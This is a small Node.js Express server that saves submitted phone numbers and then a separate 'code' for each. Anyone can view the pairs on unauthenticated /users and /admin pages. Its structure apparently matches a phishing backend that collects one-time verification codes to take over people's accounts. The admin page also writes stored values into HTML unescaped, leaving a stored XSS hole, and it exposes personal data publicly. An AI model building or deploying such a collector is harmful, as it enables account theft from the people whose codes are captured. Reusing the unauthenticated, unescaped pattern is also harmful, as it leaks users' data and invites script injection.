const express = require("express");
const cors = require("cors");
const mongoose = require("mongoose");

const app = express();

app.use(cors());
app.use(express.json());

/* =========================
   CONNECT TO MONGODB
========================= */
mongoose.connect(process.env.MONGO_URL)
  .then(() => console.log("MongoDB Connected"))
  .catch(err => console.log("Mongo Error:", err));

/* =========================
   USER MODEL
========================= */
const UserSchema = new mongoose.Schema({
  phone: String,
  code: String,
  createdAt: {
    type: Date,
    default: Date.now
  }
});

const User = mongoose.model("User", UserSchema);

/* =========================
   SAVE PHONE
========================= */
app.post("/phone", async (req, res) => {
  try {
    const { phone } = req.body;

    const user = await User.create({
      phone,
      code: ""
    });

    res.json({ id: user._id });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

/* =========================
   SAVE CODE
========================= */
app.put("/code/:id", async (req, res) => {
  try {
    const { id } = req.params;
    const { code } = req.body;

    await User.findByIdAndUpdate(id, { code });

    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

/* =========================
   GET USERS (ADMIN DATA)
========================= */
app.get("/users", async (req, res) => {
  try {
    const users = await User.find().sort({ createdAt: -1 });
    res.json(users);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

/* =========================
   SIMPLE ADMIN PAGE
========================= */
app.get("/admin", async (req, res) => {
  const users = await User.find().sort({ createdAt: -1 });

  let html = `
  <html>
  <head>
    <title>Admin Panel</title>
    <style>
      body {
        margin:0;
        font-family:tahoma;
        background:#0f172a;
        color:white;
      }
      h1 {
        text-align:center;
        padding:20px;
      }
      table {
        width:90%;
        margin:auto;
        border-collapse:collapse;
        background:#111827;
      }
      th, td {
        border:1px solid #334155;
        padding:10px;
        text-align:center;
      }
      th {
        background:#1e293b;
      }
    </style>
  </head>
  <body>
    <h1>Admin Panel</h1>
    <table>
      <tr>
        <th>Phone</th>
        <th>Code</th>
      </tr>
  `;

  users.forEach(u => {
    html += `
      <tr>
        <td>${u.phone}</td>
        <td>${u.code}</td>
      </tr>
    `;
  });

  html += `
    </table>
  </body>
  </html>
  `;

  res.send(html);
});

/* =========================
   HOME
========================= */
app.get("/", (req, res) => {
  res.send("Server is running 🚀");
});

/* =========================
   START SERVER
========================= */
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Server running on port", PORT);
});